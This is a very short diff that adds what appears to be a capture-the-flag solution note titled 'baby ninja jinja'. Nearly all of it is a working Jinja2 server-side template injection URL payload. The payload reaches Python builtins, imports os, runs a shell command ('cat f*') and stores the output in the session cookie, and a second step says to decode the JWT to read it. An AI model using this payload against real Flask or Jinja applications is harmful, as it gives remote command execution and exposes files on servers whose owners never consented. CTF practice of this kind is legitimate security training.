@@ -1,0 +1,5 @@
+baby ninja jinja
+
+step1: http://ip:port/?name={%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=yogesh&os=os&command=cat+f*
+step2: decode the jwt token and then to base64
+
